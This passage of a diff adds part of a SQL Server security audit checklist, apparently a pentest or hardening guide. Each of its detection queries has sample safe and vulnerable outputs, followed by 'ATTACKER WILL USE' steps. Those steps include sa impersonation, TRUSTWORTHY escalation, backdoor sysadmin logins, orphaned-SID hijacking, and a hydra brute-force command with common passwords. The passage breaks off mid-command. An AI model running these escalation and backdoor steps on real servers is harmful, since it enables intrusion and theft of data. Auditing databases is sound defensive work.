+        ELSE '❌ Cannot impersonate Administrator'
+    END;
+
+SAFE OUTPUT:
+current_login | target              | can_impersonate_sa
+--------------|---------------------|-------------------
+app_user      | sa                  | ❌ Cannot impersonate sa
+app_user      | DOMAIN\Administrator| ❌ Cannot impersonate Administrator
+
+VULNERABLE OUTPUT:
+current_login | target              | can_impersonate_sa
+--------------|---------------------|-------------------
+app_user      | sa                  | ✅ Can impersonate sa
+
+================================================================
+ATTACKER WILL USE (if can impersonate):
+EXECUTE AS LOGIN = 'sa';
+-- Now attacker is sysadmin
+SELECT * FROM sys.sql_logins;
+CREATE LOGIN attacker WITH PASSWORD = 'hacked!';
+ALTER SERVER ROLE sysadmin ADD MEMBER attacker;
+REVERT;
+
+================================================================
+COMMAND 13: TRUSTWORTHY DATABASES - PRIVILEGE ESCALATION
+================================================================
+
+STEP 13.1: Check TRUSTWORTHY databases
+SELECT 
+    name,
+    is_trustworthy_on,
+    is_db_chaining_on,
+    SUSER_SNAME(owner_sid) AS owner_name,
+    CASE 
+        WHEN is_trustworthy_on = 1 AND SUSER_SNAME(owner_sid) IN ('sa', 'DOMAIN\Administrator', 'sysadmin') 
+        THEN 'CRITICAL - High privileged owner with TRUSTWORTHY ON'
+        WHEN is_trustworthy_on = 1 
+        THEN 'HIGH - TRUSTWORTHY ON with potentially exploitable owner'
+        WHEN is_db_chaining_on = 1 
+        THEN 'MEDIUM - Cross DB chaining enabled'
+        ELSE 'Safe'
+    END AS risk_level
+FROM sys.databases
+WHERE is_trustworthy_on = 1 OR is_db_chaining_on = 1;
+
+SAFE OUTPUT:
+name | is_trustworthy_on | is_db_chaining_on | owner_name | risk_level
+-----|-------------------|-------------------|------------|-----------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+name        | is_trustworthy_on | is_db_chaining_on | owner_name | risk_level
+------------|-------------------|-------------------|------------|-----------
+ProductionDB| 1                 | 0                 | sa         | CRITICAL - High privileged owner with TRUSTWORTHY ON
+
+================================================================
+
+STEP 13.2: Check who is db_owner in TRUSTWORTHY databases
+SELECT 
+    d.name AS database_name,
+    p.name AS db_owner,
+    p.type_desc,
+    CASE 
+        WHEN p.name IN ('sa', 'dbo') OR IS_SRVROLEMEMBER('sysadmin') = 1 
+        THEN '✅ db_owner is sysadmin - Can exploit'
+        WHEN p.name = SUSER_SNAME() 
+        THEN '✅ Current user is db_owner - Can exploit'
+        ELSE '⚠️ Check if current user can become db_owner'
+    END AS can_exploit
+FROM sys.databases d
+LEFT JOIN sys.database_principals p ON d.owner_sid = p.sid
+WHERE d.is_trustworthy_on = 1;
+
+SAFE OUTPUT:
+database_name | db_owner | type_desc | can_exploit
+--------------|----------|-----------|------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+database_name | db_owner | type_desc | can_exploit
+--------------|----------|-----------|------------
+ProductionDB  | sa       | SQL_LOGIN | ✅ db_owner is sysadmin - Can exploit
+SalesDB       | app_user | SQL_USER  | ✅ Current user is db_owner - Can exploit
+
+================================================================
+
+STEP 13.3: Check current user's access to TRUSTWORTHY databases
+SELECT 
+    DB_NAME() AS current_db,
+    SUSER_SNAME() AS current_user,
+    HAS_PERMS_BY_NAME(DB_NAME(), 'DATABASE', 'CONTROL') AS has_db_control,
+    HAS_PERMS_BY_NAME(DB_NAME(), 'DATABASE', 'ALTER') AS has_db_alter,
+    CASE 
+        WHEN HAS_PERMS_BY_NAME(DB_NAME(), 'DATABASE', 'CONTROL') = 1 
+        THEN '✅ Can exploit TRUSTWORTHY - Has CONTROL'
+        WHEN HAS_PERMS_BY_NAME(DB_NAME(), 'DATABASE', 'ALTER') = 1 
+        THEN '✅ Can exploit TRUSTWORTHY - Has ALTER'
+        ELSE '❌ Cannot exploit TRUSTWORTHY'
+    END AS exploit_status;
+
+SAFE OUTPUT:
+current_db | current_user | has_db_control | has_db_alter | exploit_status
+-----------|--------------|----------------|--------------|----------------
+ProductionDB| app_user    | 0              | 0            | ❌ Cannot exploit TRUSTWORTHY
+
+VULNERABLE OUTPUT:
+current_db | current_user | has_db_control | has_db_alter | exploit_status
+-----------|--------------|----------------|--------------|----------------
+ProductionDB| app_user    | 1              | 1            | ✅ Can exploit TRUSTWORTHY - Has CONTROL
+
+================================================================
+ATTACKER WILL USE (if can exploit TRUSTWORTHY):
+USE ProductionDB;
+CREATE PROCEDURE sp_Escalate
+AS EXECUTE AS OWNER
+BEGIN
+   EXEC sp_addsrvrolemember 'app_user', 'sysadmin';
+END;
+EXEC sp_Escalate;
+
+================================================================
+COMMAND 14: SERVER ROLE MEMBERSHIPS - PRIVILEGE ESCALATION
+================================================================
+
+STEP 14.1: Check all server role memberships
+SELECT 
+    r.name AS role_name,
+    m.name AS member_name,
+    m.type_desc,
+    m.is_disabled,
+    CASE 
+        WHEN r.name IN ('sysadmin', 'securityadmin', 'serveradmin', 'dbcreator', 'bulkadmin')
+        AND m.is_disabled = 0
+        THEN '✅ HIGH PRIVILEGE ROLE MEMBERSHIP'
+        ELSE 'Member of role'
+    END AS role_status
+FROM sys.server_role_members srm
+JOIN sys.server_principals r ON srm.role_principal_id = r.principal_id
+JOIN sys.server_principals m ON srm.member_principal_id = m.principal_id
+WHERE m.name NOT LIKE '##%'
+ORDER BY r.name, m.name;
+
+SAFE OUTPUT:
+role_name | member_name | type_desc | is_disabled | role_status
+----------|-------------|-----------|-------------|------------
+bulkadmin | DOMAIN\svc_etl | WINDOWS_USER | 0 | Member of role
+sysadmin  | DOMAIN\svc_sql | WINDOWS_USER | 0 | ✅ HIGH PRIVILEGE ROLE MEMBERSHIP
+
+VULNERABLE OUTPUT:
+role_name | member_name | type_desc | is_disabled | role_status
+----------|-------------|-----------|-------------|------------
+dbcreator | app_user    | SQL_LOGIN  | 0          | ✅ HIGH PRIVILEGE ROLE MEMBERSHIP
+sysadmin  | app_user    | SQL_LOGIN  | 0          | ✅ HIGH PRIVILEGE ROLE MEMBERSHIP
+sysadmin  | test_user   | SQL_LOGIN  | 0          | ✅ HIGH PRIVILEGE ROLE MEMBERSHIP
+
+================================================================
+
+STEP 14.2: Check current user's role membership
+SELECT 
+    SUSER_SNAME() AS current_user,
+    IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin,
+    IS_SRVROLEMEMBER('securityadmin') AS is_securityadmin,
+    IS_SRVROLEMEMBER('serveradmin') AS is_serveradmin,
+    IS_SRVROLEMEMBER('dbcreator') AS is_dbcreator,
+    IS_SRVROLEMEMBER('bulkadmin') AS is_bulkadmin,
+    CASE 
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN '✅ SYSADMIN - Full control'
+        WHEN IS_SRVROLEMEMBER('securityadmin') = 1 THEN '✅ SECURITYADMIN - Can manage logins'
+        WHEN IS_SRVROLEMEMBER('serveradmin') = 1 THEN '✅ SERVERADMIN - Can configure server'
+        WHEN IS_SRVROLEMEMBER('dbcreator') = 1 THEN '✅ DBCREATOR - Can create databases'
+        ELSE '⚠️ Limited role membership'
+    END AS role_status;
+
+SAFE OUTPUT:
+current_user | is_sysadmin | is_securityadmin | is_serveradmin | is_dbcreator | is_bulkadmin | role_status
+-------------|-------------|------------------|----------------|--------------|--------------|-------------
+app_user     | 0           | 0                | 0              | 0            | 0            | ⚠️ Limited role membership
+
+VULNERABLE OUTPUT:
+current_user | is_sysadmin | is_securityadmin | is_serveradmin | is_dbcreator | is_bulkadmin | role_status
+-------------|-------------|------------------|----------------|--------------|--------------|-------------
+app_user     | 1           | 0                | 0              | 0            | 0            | ✅ SYSADMIN - Full control
+
+================================================================
+ATTACKER WILL USE:
+-- If sysadmin, can do anything
+EXEC sp_addsrvrolemember 'attacker', 'sysadmin';
+CREATE LOGIN backdoor WITH PASSWORD = 'hacked!';
+ALTER SERVER ROLE sysadmin ADD MEMBER backdoor;
+
+================================================================
+COMMAND 15: SERVER PERMISSIONS - PRIVILEGE ESCALATION
+================================================================
+
+STEP 15.1: Check explicit server permissions
+SELECT 
+    p.name AS principal_name,
+    p.type_desc,
+    pp.permission_name,
+    pp.state_desc,
+    CASE 
+        WHEN pp.permission_name IN ('CONTROL SERVER', 'ALTER ANY LOGIN', 'IMPERSONATE ANY LOGIN', 'SHUTDOWN')
+        AND pp.state_desc = 'GRANT'
+        THEN '✅ HIGH RISK PERMISSION'
+        ELSE 'Permission granted'
+    END AS permission_status
+FROM sys.server_principals p
+JOIN sys.server_permissions pp ON p.principal_id = pp.grantee_principal_id
+WHERE p.type IN ('S', 'U', 'G')
+AND p.name NOT LIKE '##%'
+AND pp.permission_name IN ('CONTROL SERVER', 'ALTER ANY LOGIN', 'IMPERSONATE ANY LOGIN', 
+                           'SHUTDOWN', 'CREATE ANY DATABASE', 'ALTER ANY DATABASE')
+ORDER BY p.name, pp.permission_name;
+
+SAFE OUTPUT:
+principal_name | type_desc | permission_name | state_desc | permission_status
+---------------|-----------|-----------------|------------|-------------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+principal_name | type_desc | permission_name | state_desc | permission_status
+---------------|-----------|-----------------|------------|-------------------
+app_user       | SQL_LOGIN | CONTROL SERVER  | GRANT      | ✅ HIGH RISK PERMISSION
+app_user       | SQL_LOGIN | ALTER ANY LOGIN | GRANT      | ✅ HIGH RISK PERMISSION
+
+================================================================
+
+STEP 15.2: Check current user's server permissions
+SELECT 
+    SUSER_SNAME() AS current_user,
+    HAS_PERMS_BY_NAME(NULL, 'SERVER', 'CONTROL SERVER') AS has_control_server,
+    HAS_PERMS_BY_NAME(NULL, 'SERVER', 'ALTER ANY LOGIN') AS has_alter_login,
+    HAS_PERMS_BY_NAME(NULL, 'SERVER', 'IMPERSONATE ANY LOGIN') AS has_impersonate_any,
+    CASE 
+        WHEN HAS_PERMS_BY_NAME(NULL, 'SERVER', 'CONTROL SERVER') = 1 
+        THEN '✅ CONTROL SERVER - Full control'
+        WHEN HAS_PERMS_BY_NAME(NULL, 'SERVER', 'ALTER ANY LOGIN') = 1 
+        THEN '✅ ALTER ANY LOGIN - Can manage logins'
+        WHEN HAS_PERMS_BY_NAME(NULL, 'SERVER', 'IMPERSONATE ANY LOGIN') = 1 
+        THEN '✅ IMPERSONATE ANY LOGIN - Can impersonate anyone'
+        ELSE '⚠️ No high-risk server permissions'
+    END AS permission_status;
+
+SAFE OUTPUT:
+current_user | has_control_server | has_alter_login | has_impersonate_any | permission_status
+-------------|--------------------|-----------------|---------------------|-------------------
+app_user     | 0                  | 0               | 0                   | ⚠️ No high-risk server permissions
+
+VULNERABLE OUTPUT:
+current_user | has_control_server | has_alter_login | has_impersonate_any | permission_status
+-------------|--------------------|-----------------|---------------------|-------------------
+app_user     | 1                  | 1               | 1                   | ✅ CONTROL SERVER - Full control
+
+================================================================
+ATTACKER WILL USE:
+-- If CONTROL SERVER, full access
+EXEC sp_addsrvrolemember 'attacker', 'sysadmin';
+
+-- If ALTER ANY LOGIN
+ALTER LOGIN sa ENABLE;
+ALTER LOGIN sa WITH PASSWORD = 'new_password';
+
+-- If IMPERSONATE ANY LOGIN
+EXECUTE AS LOGIN = 'sa';
+
+================================================================
+COMMAND 16: DATABASE ROLE MEMBERSHIPS - PRIVILEGE ESCALATION
+================================================================
+
+STEP 16.1: Check database role memberships
+SELECT 
+    r.name AS role_name,
+    m.name AS member_name,
+    m.type_desc,
+    CASE 
+        WHEN r.name IN ('db_owner', 'db_securityadmin', 'db_ddladmin')
+        THEN '✅ HIGH PRIVILEGE DB ROLE'
+        ELSE 'Member of role'
+    END AS role_status
+FROM sys.database_role_members drm
+JOIN sys.database_principals r ON drm.role_principal_id = r.principal_id
+JOIN sys.database_principals m ON drm.member_principal_id = m.principal_id
+WHERE m.principal_id > 4
+ORDER BY r.name, m.name;
+
+SAFE OUTPUT:
+role_name | member_name | type_desc | role_status
+----------|-------------|-----------|------------
+db_datareader | app_user | SQL_USER | Member of role
+db_datawriter | app_user | SQL_USER | Member of role
+
+VULNERABLE OUTPUT:
+role_name | member_name | type_desc | role_status
+----------|-------------|-----------|------------
+db_owner  | app_user    | SQL_USER  | ✅ HIGH PRIVILEGE DB ROLE
+db_ddladmin | app_user  | SQL_USER  | ✅ HIGH PRIVILEGE DB ROLE
+
+================================================================
+
+STEP 16.2: Check current user's database role membership
+SELECT 
+    USER_NAME() AS current_db_user,
+    IS_ROLEMEMBER('db_owner') AS is_db_owner,
+    IS_ROLEMEMBER('db_securityadmin') AS is_securityadmin,
+    IS_ROLEMEMBER('db_ddladmin') AS is_ddladmin,
+    IS_ROLEMEMBER('db_datareader') AS is_datareader,
+    CASE 
+        WHEN IS_ROLEMEMBER('db_owner') = 1 THEN '✅ DB_OWNER - Full database control'
+        WHEN IS_ROLEMEMBER('db_securityadmin') = 1 THEN '✅ DB_SECURITYADMIN - Can manage permissions'
+        WHEN IS_ROLEMEMBER('db_ddladmin') = 1 THEN '✅ DB_DDLADMIN - Can create/modify objects'
+        ELSE '⚠️ Limited database role membership'
+    END AS role_status;
+
+SAFE OUTPUT:
+current_db_user | is_db_owner | is_securityadmin | is_ddladmin | is_datareader | role_status
+----------------|-------------|------------------|-------------|---------------|-------------
+app_user        | 0           | 0                | 0           | 1             | ⚠️ Limited database role membership
+
+VULNERABLE OUTPUT:
+current_db_user | is_db_owner | is_securityadmin | is_ddladmin | is_datareader | role_status
+----------------|-------------|------------------|-------------|---------------|-------------
+app_user        | 1           | 0                | 0           | 1             | ✅ DB_OWNER - Full database control
+
+================================================================
+ATTACKER WILL USE:
+-- If db_owner, can do anything in database
+CREATE PROCEDURE sp_Escalate
+AS
+BEGIN
+   EXEC sp_addsrvrolemember 'app_user', 'sysadmin';
+END;
+
+-- If db_ddladmin, can create objects
+CREATE TABLE dbo.Backdoor (id INT);
+
+================================================================
+COMMAND 17: DATABASE PERMISSIONS - PRIVILEGE ESCALATION
+================================================================
+
+STEP 17.1: Check explicit database permissions
+SELECT 
+    g.name AS grantee_name,
+    g.type_desc,
+    p.state_desc,
+    p.permission_name,
+    OBJECT_SCHEMA_NAME(p.major_id) AS object_schema,
+    OBJECT_NAME(p.major_id) AS object_name,
+    CASE 
+        WHEN p.permission_name IN ('CONTROL', 'ALTER', 'TAKE OWNERSHIP', 'IMPERSONATE')
+        AND p.state_desc = 'GRANT'
+        THEN '✅ HIGH RISK DB PERMISSION'
+        ELSE 'Permission granted'
+    END AS permission_status
+FROM sys.database_permissions p
+JOIN sys.database_principals g ON p.grantee_principal_id = g.principal_id
+WHERE g.principal_id > 4
+AND p.permission_name IN ('CONTROL', 'ALTER', 'TAKE OWNERSHIP', 'IMPERSONATE')
+ORDER BY g.name, p.permission_name;
+
+SAFE OUTPUT:
+grantee_name | type_desc | state_desc | permission_name | object_schema | object_name | permission_status
+-------------|-----------|------------|-----------------|---------------|-------------|------------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+grantee_name | type_desc | state_desc | permission_name | object_schema | object_name | permission_status
+-------------|-----------|------------|-----------------|---------------|-------------|------------------
+app_user     | SQL_USER  | GRANT      | CONTROL         | dbo           | Users       | ✅ HIGH RISK DB PERMISSION
+app_user     | SQL_USER  | GRANT      | IMPERSONATE     | dbo           | dbo         | ✅ HIGH RISK DB PERMISSION
+
+================================================================
+
+STEP 17.2: Check current user's database permissions
+SELECT 
+    USER_NAME() AS current_user,
+    HAS_PERMS_BY_NAME('dbo.Users', 'OBJECT', 'CONTROL') AS has_control_users,
+    HAS_PERMS_BY_NAME('dbo.CreditCards', 'OBJECT', 'SELECT') AS can_select_creditcards,
+    HAS_PERMS_BY_NAME('', 'DATABASE', 'IMPERSONATE') AS can_impersonate_db,
+    CASE 
+        WHEN HAS_PERMS_BY_NAME('dbo.Users', 'OBJECT', 'CONTROL') = 1 
+        THEN '✅ CONTROL on Users - Can read/modify/delete'
+        WHEN HAS_PERMS_BY_NAME('dbo.CreditCards', 'OBJECT', 'SELECT') = 1 
+        THEN '✅ Can read CreditCards - Data exposure'
+        WHEN HAS_PERMS_BY_NAME('', 'DATABASE', 'IMPERSONATE') = 1 
+        THEN '✅ Can impersonate database users'
+        ELSE '⚠️ Limited database permissions'
+    END AS permission_status;
+
+SAFE OUTPUT:
+current_user | has_control_users | can_select_creditcards | can_impersonate_db | permission_status
+-------------|-------------------|------------------------|--------------------|-------------------
+app_user     | 0                 | 0                      | 0                  | ⚠️ Limited database permissions
+
+VULNERABLE OUTPUT:
+current_user | has_control_users | can_select_creditcards | can_impersonate_db | permission_status
+-------------|-------------------|------------------------|--------------------|-------------------
+app_user     | 1                 | 1                      | 1                  | ✅ CONTROL on Users - Can read/modify/delete
+
+================================================================
+ATTACKER WILL USE:
+-- If CONTROL on Users
+SELECT * FROM Users;
+UPDATE Users SET password = 'hacked' WHERE username = 'admin';
+DELETE FROM Users WHERE username = 'admin';
+
+-- If SELECT on CreditCards
+SELECT * FROM CreditCards;
+
+================================================================
+COMMAND 18: PUBLIC ROLE PERMISSIONS - UNAUTHORIZED ACCESS
+================================================================
+
+STEP 18.1: Check PUBLIC role permissions
+SELECT 
+    p.state_desc,
+    p.permission_name,
+    OBJECT_SCHEMA_NAME(p.major_id) AS object_schema,
+    OBJECT_NAME(p.major_id) AS object_name,
+    CASE 
+        WHEN p.permission_name IN ('SELECT', 'EXECUTE', 'CONTROL', 'ALTER') 
+        AND OBJECT_NAME(p.major_id) NOT LIKE 'sys%'
+        THEN '✅ PUBLIC can access ' + OBJECT_NAME(p.major_id)
+        ELSE 'Check'
+    END AS access_status
+FROM sys.database_permissions p
+WHERE p.grantee_principal_id = DATABASE_PRINCIPAL_ID('public')
+AND p.permission_name IN ('SELECT', 'EXECUTE', 'CONTROL', 'ALTER', 'INSERT', 'UPDATE', 'DELETE');
+
+SAFE OUTPUT:
+state_desc | permission_name | object_schema | object_name | access_status
+-----------|-----------------|---------------|-------------|---------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+state_desc | permission_name | object_schema | object_name | access_status
+-----------|-----------------|---------------|-------------|---------------
+GRANT      | SELECT          | dbo           | Users       | ✅ PUBLIC can access Users
+GRANT      | SELECT          | dbo           | CreditCards | ✅ PUBLIC can access CreditCards
+GRANT      | EXECUTE         | dbo           | sp_AdminResetPassword | ✅ PUBLIC can access sp_AdminResetPassword
+
+================================================================
+
+STEP 18.2: Check who is affected by PUBLIC permissions
+SELECT 
+    name AS user_name,
+    type_desc,
+    CASE 
+        WHEN name = 'public' THEN 'PUBLIC role - all users affected'
+        WHEN type IN ('S', 'U') THEN 'Individual user - can access PUBLIC objects'
+        ELSE 'Group - can access PUBLIC objects'
+    END AS affected_by_public
+FROM sys.database_principals
+WHERE principal_id > 0
+AND type IN ('S', 'U', 'G')
+AND name NOT LIKE '##%'
+ORDER BY name;
+
+VULNERABLE: Sab users PUBLIC role ke permissions inherit karte hain.
+
+================================================================
+ATTACKER WILL USE:
+-- Any user can do this, even without explicit permissions
+SELECT * FROM Users; -- All user data
+SELECT * FROM CreditCards; -- Credit card numbers
+SELECT * FROM EmployeeSalaries; -- Salary information
+EXEC sp_AdminResetPassword 'admin', 'newpass'; -- Reset admin password
+
+================================================================
+COMMAND 19: GUEST USER - UNAUTHORIZED ACCESS
+================================================================
+
+STEP 19.1: Check guest user status
+SELECT 
+    name,
+    authentication_type_desc,
+    CASE 
+        WHEN authentication_type_desc != 'NONE' 
+        THEN '✅ GUEST ENABLED - Unauthorized access possible'
+        ELSE '❌ GUEST DISABLED - No unauthorized access'
+    END AS guest_status
+FROM sys.database_principals WHERE name = 'guest';
+
+SAFE OUTPUT:
+name  | authentication_type_desc | guest_status
+------|--------------------------|--------------
+guest | NONE                     | ❌ GUEST DISABLED - No unauthorized access
+
+VULNERABLE OUTPUT:
+name  | authentication_type_desc | guest_status
+------|--------------------------|--------------
+guest | INSTANCE                 | ✅ GUEST ENABLED - Unauthorized access possible
+
+================================================================
+
+STEP 19.2: Check what guest can access
+SELECT 
+    p.permission_name,
+    OBJECT_SCHEMA_NAME(p.major_id) AS object_schema,
+    OBJECT_NAME(p.major_id) AS object_name,
+    CASE 
+        WHEN OBJECT_NAME(p.major_id) LIKE '%credit%' OR 
+             OBJECT_NAME(p.major_id) LIKE '%user%' OR
+             OBJECT_NAME(p.major_id) LIKE '%salary%'
+        THEN '✅ Guest can access sensitive object'
+        ELSE 'Guest can access object'
+    END AS guest_access
+FROM sys.database_permissions p
+WHERE p.grantee_principal_id = DATABASE_PRINCIPAL_ID('guest');
+
+SAFE OUTPUT:
+permission_name | object_schema | object_name | guest_access
+----------------|---------------|-------------|--------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+permission_name | object_schema | object_name | guest_access
+----------------|---------------|-------------|--------------
+SELECT          | dbo           | Users       | ✅ Guest can access sensitive object
+SELECT          | dbo           | CreditCards | ✅ Guest can access sensitive object
+
+================================================================
+ATTACKER WILL USE:
+-- Connect without any credentials
+sqlcmd -S target_server -d database_name
+-- Or
+USE database_name;
+SELECT * FROM Users;
+SELECT * FROM CreditCards;
+
+================================================================
+COMMAND 20: ORPHANED USERS - PERSISTENCE/BACKDOOR
+================================================================
+
+STEP 20.1: Check orphaned users
+SELECT 
+    dp.name AS database_user,
+    dp.type_desc,
+    dp.authentication_type_desc,
+    CASE 
+        WHEN dp.name LIKE '%admin%' OR dp.name LIKE '%sa%' 
+        THEN '✅ Orphaned admin user - High risk'
+        ELSE '⚠️ Orphaned user - Potential backdoor'
+    END AS orphaned_status
+FROM sys.database_principals dp
+LEFT JOIN sys.server_principals sp ON dp.sid = sp.sid
+WHERE dp.authentication_type = 1 
+AND dp.principal_id > 4 
+AND sp.sid IS NULL;
+
+SAFE OUTPUT:
+database_user | type_desc | authentication_type_desc | orphaned_status
+--------------|-----------|--------------------------|----------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+database_user | type_desc | authentication_type_desc | orphaned_status
+--------------|-----------|--------------------------|----------------
+old_admin     | SQL_USER  | INSTANCE                 | ✅ Orphaned admin user - High risk
+test_user     | SQL_USER  | INSTANCE                 | ⚠️ Orphaned user - Potential backdoor
+
+================================================================
+
+STEP 20.2: Check who can exploit orphaned users
+SELECT 
+    SUSER_SNAME() AS current_user,
+    dp.name AS orphaned_user,
+    CASE 
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 
+        THEN '✅ Can create login with same SID (sysadmin)'
+        WHEN HAS_PERMS_BY_NAME(NULL, 'SERVER', 'CREATE LOGIN') = 1 
+        THEN '✅ Can create login with same SID'
+        ELSE '❌ Cannot exploit orphaned user'
+    END AS exploit_possible
+FROM sys.database_principals dp
+LEFT JOIN sys.server_principals sp ON dp.sid = sp.sid
+WHERE dp.authentication_type = 1 
+AND dp.principal_id > 4 
+AND sp.sid IS NULL;
+
+SAFE OUTPUT:
+current_user | orphaned_user | exploit_possible
+-------------|---------------|------------------
+app_user     | old_admin     | ❌ Cannot exploit orphaned user
+
+VULNERABLE OUTPUT:
+current_user | orphaned_user | exploit_possible
+-------------|---------------|------------------
+app_user     | old_admin     | ✅ Can create login with same SID
+
+================================================================
+ATTACKER WILL USE:
+-- Get orphaned user SID
+SELECT dp.sid, dp.name FROM sys.database_principals dp
+WHERE dp.name = 'old_admin';
+
+-- Create login with same SID
+CREATE LOGIN old_admin WITH PASSWORD = 'hacked!', SID = <same_sid>;
+
+-- Now has access to all databases where orphaned user exists
+ALTER SERVER ROLE sysadmin ADD MEMBER old_admin;
+
+================================================================
+COMMAND 21: SA ACCOUNT - BRUTE FORCE TARGET
+================================================================
+
+STEP 21.1: Check SA account status
+SELECT 
+    name,
+    is_disabled,
+    is_policy_checked,
+    is_expiration_checked,
+    CASE 
+        WHEN is_disabled = 0 AND (is_policy_checked = 0 OR is_expiration_checked = 0)
+        THEN '✅ SA ENABLED with weak policy - Brute force possible'
+        WHEN is_disabled = 0 AND is_policy_checked = 1 AND is_expiration_checked = 1
+        THEN '⚠️ SA ENABLED with strong policy - Still brute force target'
+        WHEN is_disabled = 1 THEN '❌ SA DISABLED - Cannot brute force'
+        ELSE 'Check SA status'
+    END AS sa_status
+FROM sys.sql_logins WHERE name = 'sa';
+
+SAFE OUTPUT:
+name | is_disabled | is_policy_checked | is_expiration_checked | sa_status
+-----|-------------|-------------------|-----------------------|-----------
+sa   | 1           | 1                 | 1                     | ❌ SA DISABLED - Cannot brute force
+
+VULNERABLE OUTPUT:
+name | is_disabled | is_policy_checked | is_expiration_checked | sa_status
+-----|-------------|-------------------|-----------------------|-----------
+sa   | 0           | 0                 | 0                     | ✅ SA ENABLED with weak policy - Brute force possible
+
+================================================================
+
+STEP 21.2: Check who can brute force
+SELECT 
+    'Anyone with network access' AS attacker,
+    CASE 
+        WHEN EXISTS (SELECT 1 FROM sys.sql_logins WHERE name = 'sa' AND is_disabled = 0)
+        THEN '✅ Can brute force SA account'
+        ELSE '❌ Cannot brute force SA (disabled)'
+    END AS brute_force_possible;
+
+VULNERABLE OUTPUT:
+attacker                 | brute_force_possible
+-------------------------|----------------------
+Anyone with network access | ✅ Can brute force SA account
+
+================================================================
+ATTACKER WILL USE:
+-- Hydra/Medusa brute force
+hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://target_ip
+
+-- Common passwords to try
+sa / password
+sa / admin
+sa / 123456
+sa / P@ssw0rd
+sa / sqlserver
+
+-- If successful
+EXEC sp_addsrvrolemember 'attacker_login', 'sysadmin';
+
+================================================================
+COMMAND 22: SQL AGENT JOBS - COMMAND EXECUTION & PERSISTENCE
+================================================================
+
+STEP 22.1: Check SQL Agent jobs with OS commands
+SELECT 
+    j.name AS job_name,
+    j.enabled,
+    js.step_id,
+    js.step_name,
+    js.subsystem,
+    js.database_name,
+    js.proxy_id,
+    p.name AS proxy_name,
+    p.enabled AS proxy_enabled,
+    c.credential_identity,
+    CASE 
+        WHEN js.subsystem IN ('CmdExec', 'PowerShell', 'ActiveScripting')
+        THEN '✅ OS Command execution in job'
+        ELSE 'No OS command'
+    END AS job_step_type
+FROM msdb.dbo.sysjobs j
+JOIN msdb.dbo.sysjobsteps js ON j.job_id = js.job_id
+LEFT JOIN msdb.dbo.sysproxies p ON js.proxy_id = p.proxy_id
+LEFT JOIN sys.credentials c ON p.credential_id = c.credential_id
+WHERE j.enabled = 1
+AND js.subsystem IN ('CmdExec', 'PowerShell', 'ActiveScripting')
+ORDER BY j.name, js.step_id;
+
+SAFE OUTPUT:
+job_name | step_id | step_name | subsystem | proxy_name | job_step_type
+---------|---------|-----------|-----------|------------|--------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+job_name       | step_id | step_name   | subsystem | proxy_name    | job_step_type
+---------------|---------|-------------|-----------|---------------|--------------
+Backup_Job     | 1       | Backup      | CmdExec   | NULL          | ✅ OS Command execution in job
+ETL_Process    | 2       | Transform   | PowerShell| ETL_Proxy     | ✅ OS Command execution in job
+
+================================================================
+
+STEP 22.2: Check who can modify jobs
+SELECT 
+    j.name AS job_name,
+    SUSER_SNAME(j.owner_sid) AS job_owner,
+    p.name AS grantee,
+    p.type_desc,
+    pp.permission_name,
+    pp.state_desc,
+    CASE 
+        WHEN pp.permission_name = 'EXECUTE' AND pp.state_desc = 'GRANT' 
+        THEN '✅ Can execute job'
+        WHEN pp.permission_name = 'ALTER' AND pp.state_desc = 'GRANT' 
+        THEN '✅ Can modify job'
+        WHEN pp.permission_name = 'TAKE OWNERSHIP' AND pp.state_desc = 'GRANT' 
+        THEN '✅ Can take ownership of job'
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 
+        THEN '✅ Can modify job (sysadmin)'
+        ELSE '❌ Cannot modify job'
+    END AS job_access
+FROM msdb.dbo.sysjobs j
+LEFT JOIN sys.server_principals p ON 1=1
+LEFT JOIN sys.server_permissions pp 
+    ON p.principal_id = pp.grantee_principal_id
+    AND pp.permission_name IN ('EXECUTE', 'ALTER', 'TAKE OWNERSHIP')
+WHERE j.enabled = 1
+ORDER BY j.name;
+
+SAFE OUTPUT:
+job_name | job_owner | grantee | type_desc | permission_name | state_desc | job_access
+---------|-----------|---------|-----------|-----------------|------------|-----------
+Backup_Job| DOMAIN\svc | app_user| SQL_LOGIN | NULL            | NULL       | ❌ Cannot modify job
+
+VULNERABLE OUTPUT:
+job_name | job_owner | grantee | type_desc | permission_name | state_desc | job_access
+---------|-----------|---------|-----------|-----------------|------------|-----------
+Backup_Job| DOMAIN\svc | app_user| SQL_LOGIN | ALTER           | GRANT      | ✅ Can modify job
+
+================================================================
+
+STEP 22.3: Check current user's job access
+SELECT 
+    SUSER_SNAME() AS current_user,
+    j.name AS job_name,
+    HAS_PERMS_BY_NAME(j.name, 'OBJECT', 'EXECUTE') AS can_execute,
+    HAS_PERMS_BY_NAME(j.name, 'OBJECT', 'ALTER') AS can_modify,
+    CASE 
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 
+        THEN '✅ Can execute and modify all jobs'
+        WHEN HAS_PERMS_BY_NAME(j.name, 'OBJECT', 'ALTER') = 1 
+        THEN '✅ Can modify job: ' + j.name
+        WHEN HAS_PERMS_BY_NAME(j.name, 'OBJECT', 'EXECUTE') = 1 
+        THEN '✅ Can execute job: ' + j.name
+        ELSE '❌ Cannot access job: ' + j.name
+    END AS job_access_status
+FROM msdb.dbo.sysjobs j
+WHERE j.enabled = 1;
+
+SAFE OUTPUT:
+current_user | job_name | can_execute | can_modify | job_access_status
+-------------|----------|-------------|------------|-------------------
+app_user     | Backup_Job| 0          | 0          | ❌ Cannot access job: Backup_Job
+
+VULNERABLE OUTPUT:
+current_user | job_name | can_execute | can_modify | job_access_status
+-------------|----------|-------------|------------|-------------------
+app_user     | Backup_Job| 1          | 1          | ✅ Can modify job: Backup_Job
+
+================================================================
+ATTACKER WILL USE:
+-- Modify job to execute malicious command
+EXEC msdb.dbo.sp_update_jobstep 
